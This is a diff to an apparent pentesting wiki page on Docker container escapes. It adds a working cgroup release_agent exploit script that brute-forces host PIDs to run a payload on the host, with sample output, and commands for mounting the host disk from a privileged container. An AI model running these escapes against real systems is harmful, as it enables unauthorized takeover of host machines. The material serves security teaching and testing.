@@ -44,8 +44,8 @@ capsh --print
 
 In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:
 
-{% content-ref url="../../linux-capabilities.md" %}
-[linux-capabilities.md](../../linux-capabilities.md)
+{% content-ref url="../linux-capabilities.md" %}
+[linux-capabilities.md](../linux-capabilities.md)
 {% endcontent-ref %}
 
 ## Privileged Containers
@@ -63,8 +63,8 @@ A privileged container can be created with the flag `--privileged` or disabling 
 
 The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities. You can r**ead all the effects of `--privileged`** in this page:
 
-{% content-ref url="../docker-privileged.md" %}
-[docker-privileged.md](../docker-privileged.md)
+{% content-ref url="docker-privileged.md" %}
+[docker-privileged.md](docker-privileged.md)
 {% endcontent-ref %}
 
 In fact, `--privileged` **provides far more permissions** than needed to escape a docker container via this method. In reality, the “only” requirements are:
@@ -82,6 +82,8 @@ A container would be vulnerable to this technique if run with the flags: `--secu
 
 ### Mounting Disk
 
+#### Poc1
+
 Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
@@ -94,6 +96,31 @@ mount /dev/sda1 /mnt/hola
 ```
 
 And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
+
+#### Poc2
+
+Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
+
+```bash
+#### Check if You Can Write to a File-system
+echo 1 > /proc/sysrq-trigger
+
+#### Check root UUID
+cat /proc/cmdline
+BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300
+
+# Check Underlying Host Filesystem
+findfs UUID=<UUID Value>
+/dev/sda1
+
+# Attempt to Mount the Host's Filesystem
+mkdir /mnt-test
+mount /dev/sda1 /mnt-test
+mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
+
+#### debugfs (Interactive File System Debugger)
+debugfs /dev/sda1
+```
 
 ### Abusing release\_agent
 
@@ -143,9 +170,109 @@ head /output
 ```
 {% endcode %}
 
-## `--privileged` flag v2
+Find an **explanation of the technique** in:
 
+{% content-ref url="docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.md" %}
+[docker-release\_agent-cgroups-escape.md](docker-breakout-privilege-escalation/docker-release\_agent-cgroups-escape.md)
+{% endcontent-ref %}
 
+### Abusing release\_agents without knowing relative path
+
+In the previous exploits the **absolute path of the continer inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the continer inside the host** you can use this technique:
+
+{% content-ref url="docker-breakout-privilege-escalation/release_agent-exploit-relative-paths-to-pids.md" %}
+[release\_agent-exploit-relative-paths-to-pids.md](docker-breakout-privilege-escalation/release\_agent-exploit-relative-paths-to-pids.md)
+{% endcontent-ref %}
+
+```bash
+#!/bin/sh
+
+OUTPUT_DIR="/"
+MAX_PID=65535
+CGROUP_NAME="xyx"
+CGROUP_MOUNT="/tmp/cgrp"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+
+# Run a process for which we can search for (not needed in reality, but nice to have)
+sleep 10000 &
+
+# Prepare the payload script to execute on the host
+cat > ${PAYLOAD_PATH} << __EOF__
+#!/bin/sh
+
+OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
+
+# Commands to run on the host<
+ps -eaf > \${OUTPATH} 2>&1
+__EOF__
+
+# Make the payload script executable
+chmod a+x ${PAYLOAD_PATH}
+
+# Set up the cgroup mount using the memory resource cgroup controller
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+
+# Brute force the host pid until the output path is created, or we run out of guesses
+TPID=1
+while [ ! -f ${OUTPUT_PATH} ]
+do
+  if [ $((${TPID} % 100)) -eq 0 ]
+  then
+    echo "Checking pid ${TPID}"
+    if [ ${TPID} -gt ${MAX_PID} ]
+    then
+      echo "Exiting at ${MAX_PID} :-("
+      exit 1
+    fi
+  fi
+  # Set the release_agent path to the guessed pid
+  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+  # Trigger execution of the release_agent
+  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+  TPID=$((${TPID} + 1))
+done
+
+# Wait for and cat the output
+sleep 1
+echo "Done! Output:"
+cat ${OUTPUT_PATH}
+```
+
+Executing the PoC within a privileged container should provide output similar to:
+
+```bash
+root@container:~$ ./release_agent_pid_brute.sh
+Checking pid 100
+Checking pid 200
+Checking pid 300
+Checking pid 400
+Checking pid 500
+Checking pid 600
+Checking pid 700
+Checking pid 800
+Checking pid 900
+Checking pid 1000
+Checking pid 1100
+Checking pid 1200
+
+Done! Output:
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 11:25 ?        00:00:01 /sbin/init
+root         2     0  0 11:25 ?        00:00:00 [kthreadd]
+root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
+root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
+root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
+root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
+root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
+root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
+...
+```
 
 ### Runc exploit (CVE-2019-5736)
 
@@ -164,26 +291,9 @@ For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape
 There are other CVEs the container can be vulnerable too
 {% endhint %}
 
-### Writable hostPath Mount
-
-(Info from [**here**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
-
-```bash
-#### Check if You Can Write to a File-system
-$ echo 1 > /proc/sysrq-trigger
-
-#### Check root UUID
-$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
-$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
-$ mkdir /mnt-test
-$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
-
-#### debugfs (Interactive File System Debugger)
-$ debugfs /dev/sda1
-```
-
 ## References
 
 * [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
 * [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
 * [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
+* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
